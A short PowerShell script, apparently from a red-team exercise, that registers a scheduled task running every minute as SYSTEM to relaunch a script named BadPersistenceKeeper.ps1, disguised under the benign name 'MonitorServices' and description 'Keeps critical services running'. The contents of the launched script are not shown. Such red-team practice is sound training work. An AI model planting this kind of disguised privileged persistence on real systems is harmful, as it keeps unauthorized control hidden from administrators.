
#Change the argument to where your file is actaully located 
$Action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-File C:\Users\jelli\SoftDev1\Redteam\uabtc\Josh\Staying Alive\BadPersistenceKeeper.ps1"
$Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1)
Register-ScheduledTask -Action $Action -Trigger $Trigger -TaskName "MonitorServices" -Description "Keeps critical services running" -User "SYSTEM" -RunLevel Highest